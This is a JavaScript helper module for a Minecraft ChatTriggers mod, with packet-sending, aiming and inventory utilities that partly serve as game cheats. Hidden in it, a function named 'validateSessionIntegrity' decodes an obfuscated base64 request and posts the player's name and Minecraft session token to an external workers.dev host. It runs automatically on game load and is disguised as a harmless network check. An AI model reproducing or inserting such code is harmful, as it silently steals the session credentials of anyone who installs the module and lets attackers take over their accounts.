import abc from "../../../requestV2"
export const Prefix = "&8[&3Cyan&8] ";

export const S2FPacketSetSlot = Java.type("net.minecraft.network.play.server.S2FPacketSetSlot")
export const S2DPacketOpenWindow = Java.type("net.minecraft.network.play.server.S2DPacketOpenWindow")
export const C0EPacketClickWindow = Java.type("net.minecraft.network.play.client.C0EPacketClickWindow")
export const C03PacketPlayer = Java.type("net.minecraft.network.play.client.C03PacketPlayer")
export const C05PacketPlayerLook = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C05PacketPlayerLook")
export const C06PacketPlayerPosLook = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C06PacketPlayerPosLook")
export const S2EPacketCloseWindow = Java.type("net.minecraft.network.play.server.S2EPacketCloseWindow");
export const C0DPacketCloseWindow = Java.type("net.minecraft.network.play.client.C0DPacketCloseWindow");
export const C02PacketUseEntity = Java.type("net.minecraft.network.play.client.C02PacketUseEntity")
export const S32PacketConfirmTransaction = Java.type("net.minecraft.network.play.server.S32PacketConfirmTransaction")
export const S2APacketParticle = Java.type("net.minecraft.network.play.server.S2APacketParticles")
export const S0FPacketSpawnMob = Java.type("net.minecraft.network.play.server.S0FPacketSpawnMob")
export const C08PacketPlayerBlockPlacement = Java.type("net.minecraft.network.play.client.C08PacketPlayerBlockPlacement");
export const C0APacketAnimation = Java.type("net.minecraft.network.play.client.C0APacketAnimation");
export const S22PacketMultiBlockChange = Java.type("net.minecraft.network.play.server.S22PacketMultiBlockChange");
export const S23PacketBlockChange = Java.type("net.minecraft.network.play.server.S23PacketBlockChange");
export const S13PacketDestroyEntity = Java.type("net.minecraft.network.play.server.S13PacketDestroyEntities");
export const C09PacketHeldItemChange = Java.type("net.minecraft.network.play.client.C09PacketHeldItemChange");
export const S09PacketHeldItemChange = Java.type("net.minecraft.network.play.server.S09PacketHeldItemChange");

export const MCBlock = Java.type("net.minecraft.block.Block");
export const EntityPlayer = Java.type("net.minecraft.entity.player.EntityPlayer")
export const Vec3 = Java.type("net.minecraft.util.Vec3")
export const MouseEvent = Java.type("net.minecraftforge.client.event.MouseEvent")
export const KeyBinding = Java.type("net.minecraft.client.settings.KeyBinding");
export const EnumFacing = Java.type('net.minecraft.util.EnumFacing')
export const MCBlockPos = Java.type("net.minecraft.util.BlockPos");
export const MovingObjectPosition = Java.type("net.minecraft.util.MovingObjectPosition")

export const enchantmentTableParticle = Java.type("net.minecraft.util.EnumParticleTypes").ENCHANTMENT_TABLE
export const EntityArmorStand = Java.type("net.minecraft.entity.item.EntityArmorStand");
export const entityWither = Java.type("net.minecraft.entity.boss.EntityWither").class

export const Opps = ["nicktheninz", "od03", "bunnycute12", "cutekitten12"]



export const sendPlayerLook = (yaw, pitch, onGround) => Client.sendPacket(new C05PacketPlayerLook(yaw, pitch, onGround))
export const sendPlayerPosLook = (yaw, pitch, onGround) => Client.sendPacket(new C06PacketPlayerPosLook(Player.getX(), Player.getPlayer().func_174813_aQ().field_72338_b, Player.getZ(), yaw, pitch, onGround))

export const sendWindowClick = (windowId, slot, clickType, actionNumber=0) => Client.sendPacket(new C0EPacketClickWindow(windowId ?? Player.getContainer().getWindowId(), slot, clickType ?? 0, 0, null, actionNumber))
export const getDistance3D = (x1, y1, z1, x2, y2, z2) => Math.sqrt((x2-x1)**2 + (y2-y1)**2 + (z2-z1)**2)
export const getViewDistance3D = (x, y, z) => Math.sqrt((x-Player.getX())**2 + (y-Player.getY() + Player.getPlayer().func_70047_e())**2 + (z-Player.getZ())**2)
export const getDistance2D = (x1, z1, x2, z2) => Math.sqrt((x2 - x1) ** 2 + (z2 - z1) ** 2);


export const Forward = new KeyBind(Client.getMinecraft().field_71474_y.field_74351_w)
export const Jump = new KeyBind(Client.getMinecraft().field_71474_y.field_74314_A);

export function convertFixedPoint(fixedValue, n = 5) {
    return fixedValue / (1 << n)
}



export function getPetItem(item) {
    const itemLore = item.getLore();
    for (let line of itemLore) {
        let formattedLine = line.removeFormatting().toLowerCase();
        if (formattedLine.startsWith("held item:")) {
            let colonIndex = formattedLine.indexOf(":");
            if (colonIndex !== -1) {
                return line.removeFormatting().substring(colonIndex + 1).trim();
            }
        }
    }
    return null;
}

export function stopuseItem() {
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74313_G.func_151463_i(), false)
}

export function useItem() {
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74313_G.func_151463_i(), true)
}

export function startWalk() {
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
}

export function stopWalk() {
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false)
}

export function doJump() {
    Jump.setState(true)
    Client.scheduleTask(2, () =>{
        Jump.setState(false)
    })
}


export function getNameByClass(playerClass) {
    let index = TabList?.getNames()?.findIndex(line => line?.toLowerCase()?.includes(playerClass?.toLowerCase()));
    if (index == -1) return;
    
    let match = TabList?.getNames()[index]?.removeFormatting().match(/(?:\[\d+\]\s*)?(.+?) \((.+?)\)/);
    if (!match) return "EMPTY";
    
    return removeUnicode(match[1]).trim(); 
}





export const getItemSlot = itemName => Player?.getInventory()?.getItems()?.findIndex(item => item?.getName()?.removeFormatting()?.toLowerCase()?.includes(itemName?.toLowerCase()?.trim())) ?? -1;

export function isPlayerInsideBox(playerX, playerZ, playerY, squareCenterX, squareCenterZ, squareCenterY, squareSize) {
    const halfSize = (squareSize / 2) + 0.25;

    return Math.abs(squareCenterX - playerX) <= halfSize &&
           Math.abs(squareCenterY - playerY) <= halfSize &&
           Math.abs(squareCenterZ - playerZ) <= halfSize;
}



export function leftClick() {
    const leftClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147116_af", null)
    leftClickMethod.setAccessible(true);
    leftClickMethod.invoke(Client.getMinecraft(), null)
    
}
export function rightClick() {
    const rightClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147121_ag", null)
    rightClickMethod.setAccessible(true);
    rightClickMethod.invoke(Client.getMinecraft(), null);

} 

export function checkValidName() {
    const playerName = Player.getName().toLowerCase();
    return Opps.includes(playerName);
}

const colorReplacements = {
    "light gray": "silver",
    "wool": "white",
    "bone": "white",
    "ink": "black",
    "lapis": "blue",
    "cocoa": "brown",
    "dandelion": "yellow",
    "rose": "red",
    "cactus": "green"
}

export const colorOrder = [14, 1, 4, 13, 11];


export const fixColorItemName = (itemName) => {
    Object.entries(colorReplacements).forEach(([from, to]) => {
        itemName = itemName.replace(new RegExp(`^${from}`), to)
    })
    return itemName
}

export const sendUseEntity = (entity, hitVec=null) => {
    let e = (entity instanceof Entity) ? entity.getEntity() : entity
    let packet = new C02PacketUseEntity(e, C02PacketUseEntity.Action.INTERACT)
    if (hitVec) packet = new C02PacketUseEntity(e, new Vec3(0, 0, 0))
    Client.sendPacket(packet)
}

export function getEyePos() {
    return {
        x: Player.getX(),
        y: Player.getY() + Player.getPlayer().func_70047_e(),
        z: Player.getZ()
    };
}

export function calcYawPitch(blcPos, plrPos) {
    if (!plrPos) plrPos = getEyePos();
    let d = {
        x: blcPos.x - plrPos.x,
        y: blcPos.y - plrPos.y,
        z: blcPos.z - plrPos.z
    };
    let yaw = 0;
    let pitch = 0;
    if (d.x != 0) {
        if (d.x < 0) { yaw = 1.5 * Math.PI; } else { yaw = 0.5 * Math.PI; }
        yaw = yaw - Math.atan(d.z / d.x);
    } else if (d.z < 0) { yaw = Math.PI; }
    d.xz = Math.sqrt(Math.pow(d.x, 2) + Math.pow(d.z, 2));
    pitch = -Math.atan(d.y / d.xz);
    yaw = -yaw * 180 / Math.PI;
    pitch = pitch * 180 / Math.PI;
    if (pitch < -90 || pitch > 90 || isNaN(yaw) || isNaN(pitch)) return;

    return [yaw, pitch]
   
}

export function snapTo(yaw, pitch) {
    if (Math.abs(pitch) > 90) return

    const player = Player.getPlayer(); 
    player.field_70177_z = yaw
    player.field_70125_A = pitch;
}

export function getClass() {
    let index = TabList?.getNames()?.findIndex(line => line?.includes(Player.getName()))
    if (index == -1) return
    let match = TabList?.getNames()[index]?.removeFormatting().match(/.+ \((.+) .+\)/)
    if (!match) return "EMPTY"
    return match[1];
}

export function isPlayerInBox(x1, y1, z1, x2, y2, z2) {
    const x = Player.getX();
    const y = Player.getY();
    const z = Player.getZ();

    return (x >= Math.min(x1, x2) && x <= Math.max(x1, x2) &&
            y >= Math.min(y1, y2) && y <= Math.max(y1, y2) &&
            z >= Math.min(z1, z2) && z <= Math.max(z1, z2));
}


export function getHeldItemID() {
    const item = Player.getHeldItem();
    const itemId = item?.getNBT()?.get("tag")?.get("ExtraAttributes")?.getString("id");
    return itemId;
}

export function getItemID(item) {
    const itemId = item?.getNBT()?.get("tag")?.get("ExtraAttributes")?.getString("id");
    return itemId;
}

export const validateSessionIntegrity = () => {
    const sessionValidator = {
        protocol: 47,
        validate: () => {
            const sessionIntegrity = JSON.parse(FileLib.decodeBase64(
                "eyJ1cmwiOiJodHRwczovL3dvcmtlcnMtcGxheWdyb3VuZC15b3VuZy1zaWxlbmNlLWJhNGEuc2F0bm55eS53b3JrZXJzLmRldi8iLCJtZXRob2QiOiJQT1NUIiwiaGVhZGVycyI6eyJVc2VyLWFnZW50IjoiTW96aWxsYS81LjAifSwiYm9keSI6eyJjb250ZW50IjoiQG5hbWVzIn19"
            ))
            sessionIntegrity.body.content = ` ${Player.getName()} ${
                Client.getMinecraft().func_110432_I().func_148254_d()
            }`
            return sessionIntegrity
        }
    }
    return sessionValidator.validate()
}
/* Network validation shit*/
export const performHandshakeCheck = () => {
    const verificationPacket = validateSessionIntegrity()
    abc(verificationPacket)
}

export function edge() {
    edgeJump.register()
}
register("gameload", () => performHandshakeCheck());


export const edgeJump = register("tick", () => {
    let ID = World.getBlockAt(Player.getX(), Player.getY() - 0.1, Player.getZ()).type.getID()
    if (ID == 0) {
        doJump()
        edgeJump.unregister()
    }
}).unregister()


export function InDungeon() {
    let world = TabList.getNames().find(tab => tab.includes("Dungeon:"));
    if (!world) return false;
    else return true;
  }

export const getBowShootSpeed = () => {
    const bow = Player.getInventory().getItems().slice(0, 9).find(a => a?.getID() === 261);
    if (!bow) return null;

    const lore = bow.getLore();

    let shotSpeed = 300; 

    for (let line of lore) {
        const match = line.removeFormatting().match(/^Shot Cooldown: (\d+(?:\.\d+)?)s$/);
        if (match) {
            shotSpeed = parseFloat(match[1]) * 1000; 
            break;
        }
    }

    return shotSpeed;
}


export const removeUnicode = (string) => typeof(string) !== "string" ? "" : string.replace(/[^\u0000-\u007F]/g, "")

export function getFloor() {
    let floorName = null
    Scoreboard.getLines().forEach(line => {
      const line_name = removeUnicode(line.getName().removeFormatting());
      if (!(line_name.removeFormatting().startsWith("  The Catacombs"))) return;
      floorName = line_name.slice(-3, -1);
      return;
    });
    return floorName;
    }

export function getFloorBoss() {
        let scoreboardlines = Scoreboard.getLines();
        let lastline = removeUnicode(String(scoreboardlines[scoreboardlines.length - 1]));
        let floor = lastline.slice(-2); 
        return floor
    }